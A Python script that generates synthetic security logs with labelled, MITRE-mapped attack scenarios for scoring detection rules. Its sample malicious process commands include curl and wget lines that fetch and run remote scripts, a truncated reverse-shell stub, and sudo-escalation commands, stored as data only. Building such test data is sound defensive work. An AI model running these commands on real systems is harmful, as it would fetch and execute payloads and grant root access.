"""Generate synthetic security telemetry with labeled, MITRE-mapped attacks.

One unified event table (auth, process, network). Benign traffic dominates; a set
of attack scenarios is injected and labeled with an attack_id and MITRE technique
so detections can be scored honestly against ground truth.

Attack scenarios:
  T1110 Brute Force          - many failed logins from one IP, then a success
  T1078 Valid Accounts       - impossible travel (same user, two far countries, fast)
  T1059 Command/Scripting    - suspicious process (curl | bash, base64 -d, /tmp exec)
  T1548 Privilege Escalation - non-admin user sudo-ing to root / added to sudoers
  T1041 Exfiltration         - large outbound transfer to an external IP
"""
from __future__ import annotations

import numpy as np
import pandas as pd

RNG = np.random.default_rng(1337)
START = pd.Timestamp("2025-06-01")
DAYS = 10
N_USERS = 200
N_HOSTS = 60
HOME = {u: c for u, c in zip(range(N_USERS), RNG.choice(["US", "US", "US", "IN", "GB", "DE"], N_USERS))}
GEO = {"US": (38, -97), "IN": (22, 79), "GB": (54, -2), "DE": (51, 10), "RU": (61, 99), "BR": (-10, -55)}


def _ts(day, hour=None):
    h = hour if hour is not None else RNG.integers(6, 22)
    return START + pd.Timedelta(days=int(day), hours=int(h), minutes=int(RNG.integers(0, 60)), seconds=int(RNG.integers(0, 60)))


def _ip(country):
    base = {"US": "52", "IN": "103", "GB": "51", "DE": "88", "RU": "95", "BR": "177"}.get(country, "40")
    return f"{base}.{RNG.integers(0,256)}.{RNG.integers(0,256)}.{RNG.integers(1,255)}"


def generate():
    rows = []

    def add(**kw):
        base = dict(ts=None, event_type=None, user=None, src_ip=None, country=None, host=None,
                    action=None, process=None, parent=None, cmdline=None, dst_ip=None,
                    bytes_out=0, attack_id=None, technique=None, is_malicious=0)
        base.update(kw); rows.append(base)

    # ---------------- benign auth ----------------
    for u in range(N_USERS):
        c = HOME[u]
        for d in range(DAYS):
            for _ in range(int(RNG.integers(3, 12))):
                success = RNG.random() > 0.06
                add(ts=_ts(d), event_type="auth", user=f"user{u:03d}", src_ip=_ip(c), country=c,
                    host=f"host{RNG.integers(0,N_HOSTS):02d}",
                    action="login_success" if success else "login_failure")

    # ---------------- benign processes ----------------
    benign_cmds = ["/usr/bin/python3 app.py", "/bin/bash deploy.sh", "sshd: user",
                   "nginx -g daemon", "kubectl get pods", "/usr/bin/git pull", "systemctl status"]
    for _ in range(18000):
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="process", user=f"user{RNG.integers(0,N_USERS):03d}",
            host=f"host{RNG.integers(0,N_HOSTS):02d}", parent="bash",
            process=RNG.choice(["python3", "bash", "git", "kubectl", "nginx"]),
            cmdline=str(RNG.choice(benign_cmds)))

    # ---------------- benign network ----------------
    for _ in range(14000):
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="network", host=f"host{RNG.integers(0,N_HOSTS):02d}",
            dst_ip=_ip(RNG.choice(["US", "GB", "DE"])), bytes_out=int(abs(RNG.normal(2_000_000, 1_500_000))))

    aid = 0
    # ---------------- T1110 brute force ----------------
    for _ in range(9):
        aid += 1; u = RNG.integers(0, N_USERS); ip = _ip(RNG.choice(["RU", "BR"]))
        host = f"host{RNG.integers(0,N_HOSTS):02d}"; d = RNG.integers(0, DAYS); h = RNG.integers(0, 24)
        for i in range(int(RNG.integers(25, 70))):
            add(ts=START + pd.Timedelta(days=int(d), hours=int(h), seconds=int(i*RNG.integers(2,6))),
                event_type="auth", user=f"user{u:03d}", src_ip=ip, country="RU", host=host,
                action="login_failure", attack_id=f"A{aid}", technique="T1110", is_malicious=1)
        add(ts=START + pd.Timedelta(days=int(d), hours=int(h), minutes=8), event_type="auth",
            user=f"user{u:03d}", src_ip=ip, country="RU", host=host, action="login_success",
            attack_id=f"A{aid}", technique="T1110", is_malicious=1)

    # ---------------- T1078 impossible travel ----------------
    for _ in range(6):
        aid += 1; u = RNG.integers(0, N_USERS); d = RNG.integers(0, DAYS); h = RNG.integers(6, 18)
        add(ts=START + pd.Timedelta(days=int(d), hours=int(h)), event_type="auth", user=f"user{u:03d}",
            src_ip=_ip("US"), country="US", host=f"host{RNG.integers(0,N_HOSTS):02d}",
            action="login_success", attack_id=f"A{aid}", technique="T1078", is_malicious=1)
        add(ts=START + pd.Timedelta(days=int(d), hours=int(h), minutes=45), event_type="auth", user=f"user{u:03d}",
            src_ip=_ip("RU"), country="RU", host=f"host{RNG.integers(0,N_HOSTS):02d}",
            action="login_success", attack_id=f"A{aid}", technique="T1078", is_malicious=1)

    # ---------------- T1059 suspicious process ----------------
    mal_cmds = ["bash -c 'curl http://185.34.2.9/x.sh | bash'", "base64 -d payload.b64 | bash",
                "chmod +x /tmp/.k && /tmp/.k", "python3 -c 'import socket,os,pty;...'",
                "wget http://45.9.1.7/m -O /tmp/m && /tmp/m"]
    for _ in range(12):
        aid += 1
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="process", user=f"user{RNG.integers(0,N_USERS):03d}",
            host=f"host{RNG.integers(0,N_HOSTS):02d}", parent=RNG.choice(["nginx", "sshd", "cron"]),
            process=RNG.choice(["bash", "python3", "curl"]), cmdline=str(RNG.choice(mal_cmds)),
            attack_id=f"A{aid}", technique="T1059", is_malicious=1)

    # ---------------- T1548 privilege escalation ----------------
    for _ in range(7):
        aid += 1
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="process", user=f"user{RNG.integers(0,N_USERS):03d}",
            host=f"host{RNG.integers(0,N_HOSTS):02d}", parent="bash", process="sudo",
            cmdline=str(RNG.choice(["sudo su -", "usermod -aG sudo user099", "sudo bash -i"])),
            attack_id=f"A{aid}", technique="T1548", is_malicious=1)

    # ---------------- T1041 exfiltration ----------------
    for _ in range(5):
        aid += 1
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="network", host=f"host{RNG.integers(0,N_HOSTS):02d}",
            dst_ip=_ip("RU"), bytes_out=int(RNG.integers(600, 3000) * 1_000_000),
            attack_id=f"A{aid}", technique="T1041", is_malicious=1)

    # ---------------- benign-but-suspicious noise (false-positive bait, is_malicious=0) ----------------
    # password-reset storms: real users fat-fingering their password
    for _ in range(6):
        u = RNG.integers(0, N_USERS); c = HOME[u]; ip = _ip(c); host = f"host{RNG.integers(0,N_HOSTS):02d}"
        d = RNG.integers(0, DAYS); h = RNG.integers(8, 18)
        for i in range(int(RNG.integers(12, 22))):
            add(ts=START + pd.Timedelta(days=int(d), hours=int(h), minutes=int(i)), event_type="auth",
                user=f"user{u:03d}", src_ip=ip, country=c, host=host, action="login_failure")
    # benign large backups to an internal-ish destination
    for _ in range(5):
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="network", host=f"host{RNG.integers(0,N_HOSTS):02d}",
            dst_ip=_ip("US"), bytes_out=int(RNG.integers(150, 480) * 1_000_000))
    # benign admin sudo (looks like priv-esc but is routine ops)
    for _ in range(8):
        add(ts=_ts(RNG.integers(0, DAYS)), event_type="process", user=f"user{RNG.integers(0,N_USERS):03d}",
            host=f"host{RNG.integers(0,N_HOSTS):02d}", parent="bash", process="sudo",
            cmdline=str(RNG.choice(["sudo su -", "sudo systemctl restart nginx"])))

    # a low-and-slow brute force that stays under the rule threshold (rule should MISS this one)
    aid += 1; u = RNG.integers(0, N_USERS); ip = _ip("BR"); host = f"host{RNG.integers(0,N_HOSTS):02d}"
    d = RNG.integers(0, DAYS); h = RNG.integers(0, 24)
    for i in range(11):
        add(ts=START + pd.Timedelta(days=int(d), hours=int(h), minutes=int(i*7)), event_type="auth",
            user=f"user{u:03d}", src_ip=ip, country="BR", host=host, action="login_failure",
            attack_id=f"A{aid}", technique="T1110", is_malicious=1)

    df = pd.DataFrame(rows)
    df["ts"] = pd.to_datetime(df["ts"])
    return df.sort_values("ts").reset_index(drop=True)


if __name__ == "__main__":
    import os
    os.makedirs("data", exist_ok=True)
    df = generate()
    df.to_csv("data/events.csv", index=False)
    print(f"events: {len(df):,}  ({df['event_type'].value_counts().to_dict()})")
    print(f"malicious events: {int(df['is_malicious'].sum())}  across {df['attack_id'].nunique()} attack cases")
    print("techniques:", df[df.is_malicious==1]['technique'].value_counts().to_dict())
